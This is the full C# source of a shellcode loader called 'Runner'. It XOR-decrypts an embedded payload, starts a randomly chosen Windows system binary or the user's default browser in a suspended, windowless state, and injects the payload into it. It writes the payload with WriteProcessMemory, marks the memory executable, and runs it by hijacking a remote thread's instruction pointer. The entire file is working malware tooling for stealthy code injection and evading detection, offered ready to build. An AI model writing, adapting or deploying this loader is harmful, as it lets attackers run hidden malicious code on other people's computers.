using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;

namespace Runner
{
    class Program
    {
        #region Types and Enums

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CONTEXT
        {
            public uint ContextFlags; //set this to an appropriate value 
                                      // Retrieved by CONTEXT_DEBUG_REGISTERS 
            public uint Dr0;
            public uint Dr1;
            public uint Dr2;
            public uint Dr3;
            public uint Dr6;
            public uint Dr7;
            // Retrieved by CONTEXT_FLOATING_POINT 
            public FLOATING_SAVE_AREA FloatSave;
            // Retrieved by CONTEXT_SEGMENTS 
            public uint SegGs;
            public uint SegFs;
            public uint SegEs;
            public uint SegDs;
            // Retrieved by CONTEXT_INTEGER 
            public uint Edi;
            public uint Esi;
            public uint Ebx;
            public uint Edx;
            public uint Ecx;
            public uint Eax;
            // Retrieved by CONTEXT_CONTROL 
            public uint Ebp;
            public uint Eip;
            public uint SegCs;
            public uint EFlags;
            public uint Esp;
            public uint SegSs;
            // Retrieved by CONTEXT_EXTENDED_REGISTERS 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 512)]
            public byte[] ExtendedRegisters;
        }

        // Next x64

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }

        /// <summary>
        /// x64
        /// </summary>
        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }



        public delegate void ThreadStartDelegate();

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public unsafe byte* lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        #endregion

        #region pinvoke sigs

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ResumeThread(IntPtr hThread);

        // Get context of thread x64, in x64 application
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, MemoryProtection flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
          IntPtr hProcess,
          IntPtr lpBaseAddress,
          byte[] lpBuffer,
          Int32 nSize,
          out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [MarshalAs(UnmanagedType.AsAny)] object lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
             ProcessAccessFlags processAccess,
             bool bInheritHandle,
             int processId
        );

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
                                            uint dwSize, AllocationType flAllocationType,
                                            MemoryProtection flProtect);

        public static IntPtr OpenProcess(Process proc, ProcessAccessFlags flags)
        {
            return OpenProcess(flags, false, proc.Id);
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);


        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
           IntPtr lpThreadAttributes, uint dwStackSize, ThreadStartDelegate
           lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
           IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
           IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        #endregion

        #region User Defined functions

        static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static string GetDefaultBrowser()
        {
            string defaultBrowser = "";
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\Shell\\Associations\\URLAssociations\\https\\UserChoice"))
            {
                if (key != null)
                {
                    Object o = key.GetValue("ProgId");
                    if (o != null)
                    {
                        defaultBrowser = o.ToString();                                            //do what you like with version
                    }
                }
            }

            // Now find the open command
            string regOpenPath = defaultBrowser + "\\shell\\open\\command";
            string defaultBrowserPath = "";
            using (RegistryKey key = Registry.ClassesRoot.OpenSubKey(regOpenPath))
            {
                if (key != null)
                {
                    Object o = key.GetValue("");
                    if (o != null)
                    {
                        string launchPath = o.ToString().Trim('"');                                            //do what you like with version
                        int exeIndex = launchPath.IndexOf(".exe");
                        defaultBrowserPath = launchPath.Substring(0, exeIndex + 4);
                    }
                }
            }
            return defaultBrowserPath;
        }

        static string GetWindowsBinary()
        {
            string[] binaries = new string[]
            {
                "\\splwow64.exe",
                "\\System32\\printfilterpipelinesvc.exe",
                "\\System32\\PrintIsolationHost.exe",
                "\\System32\\spoolsv.exe",
                "\\System32\\upnpcont.exe",
                "\\System32\\conhost.exe",
                "\\System32\\convertvhd.exe"
            };
            string systemRoot = Environment.GetEnvironmentVariable("SYSTEMROOT");
            Random rnd = new Random();
            int binIndex = rnd.Next(0, binaries.Length);
            string result = systemRoot + binaries[binIndex];
            return result;
        }

        static string GetValidExecutable()
        {
            string result = "";
            if (IsHighIntegrity())
            {
                result = GetWindowsBinary();
            }
            else
            {
                result = GetDefaultBrowser();
            }
            if (result == "")
            {
                result = GetWindowsBinary();
            }
            return result;
        }

        static byte[] GetAllDecryptedBytes()
        {
            // Change this encryption key if it was set differently
            // in Cryptor's Program.cs
            char[] cryptor = new char[] { 'S', 'e', 'c', 'r', 'e', 't', 'K', 'e', 'y', '\0' };
            // You'll need to ensure you have the encrypted shellcode
            // added as an embedded resource.
            byte[] rawData = Runner.Properties.Resources.encrypted;
            byte[] result = new byte[rawData.Length];
            int j = 0;

            for (int i = 0; i < rawData.Length; i++)
            {
                if (j == cryptor.Length - 1)
                {
                    j = 0;
                }
                byte res = (byte)(rawData[i] ^ Convert.ToByte(cryptor[j]));
                result[i] = res;
                j += 1;
            }
            return result;
        }

        static void Detonate()
        {
            bool retValue;
            string binPath = GetValidExecutable();
            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
            STARTUPINFO sInfo = new STARTUPINFO();
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);
            const uint CREATE_SUSPENDED = 0x00000004;
            const uint CREATE_NO_WINDOW = 0x08000000;
            //MessageBox.Show("binPath: "  + binPath);
            retValue = CreateProcess(
                binPath,
                null,
                ref pSec,
                ref tSec,
                false,
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref sInfo,
                out pInfo);

            // You NEED to add as a resource the encyrpted shellcode.
            // You can do this by going to Project -> Properties -> Resources
            // Then add a new file, then select the encrypted.bin (you'll need to
            // ensure that all files are viewable to add, not just text).
            // The, on the right side in solution explorer, click the encrypted.bin
            // file and ensure the build action is set to "Embedded Resource".
            uint rawDataLength = (uint)Runner.Properties.Resources.encrypted.Length;
            IntPtr hProc = OpenProcess(ProcessAccessFlags.All, false, pInfo.dwProcessId);
            //MessageBox.Show("Opened process.");
            IntPtr pRemoteThread = VirtualAllocEx(
                hProc,
                IntPtr.Zero,
                rawDataLength,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite);
            //MessageBox.Show("Allocated space");
            Random rnd = new Random();
            int SIZE_MOD = rnd.Next(100, 501);
            int totalBytesWritten = 0;
            //MessageBox.Show("Beginning deryption");

            // All at once
            byte[] decBytes = GetAllDecryptedBytes();
            IntPtr bytesWritten = IntPtr.Zero;
            WriteProcessMemory(hProc, pRemoteThread, decBytes, decBytes.Length, out bytesWritten);

            
            IntPtr kernel32Addr = LoadLibrary("kernel32.dll");
            IntPtr loadLibraryAddr = GetProcAddress(kernel32Addr, "LoadLibraryA");
            if (loadLibraryAddr == null)
            {
                Console.WriteLine("Couldn't get proc address for kern32 loadlibraryaddr");
                Environment.Exit(1);
            }
            //MessageBox.Show("Kernel 32 Addr loaded");
            uint oldProtect = 0;
            bool reportected = VirtualProtectEx(hProc, pRemoteThread, rawDataLength, MemoryProtection.ExecuteRead, out oldProtect);
            if (reportected)
            {
                //MessageBox.Show("Was able to reportect");
                ThreadStartDelegate funcdelegate = (ThreadStartDelegate)Marshal.GetDelegateForFunctionPointer(loadLibraryAddr, typeof(ThreadStartDelegate));
                IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, funcdelegate, IntPtr.Zero, 0x00000004, IntPtr.Zero);
                if (hThread == null)
                {
                    Console.WriteLine("Couldn't create remote thread");
                    Environment.Exit(1);
                }
                //MessageBox.Show("Created remote thread");
                CONTEXT64 ctx = new CONTEXT64();
                ctx.ContextFlags = CONTEXT_FLAGS.CONTEXT_CONTROL;
                GetThreadContext(hThread, ref ctx);
                ctx.Rip = (UInt64)pRemoteThread;
                SetThreadContext(hThread, ref ctx);
                ResumeThread(hThread);
                CloseHandle(hThread);
                //MessageBox.Show("done");
            }
        }

#endregion

        static void Main(string[] args)
        {
            Detonate();
        }


    }
}
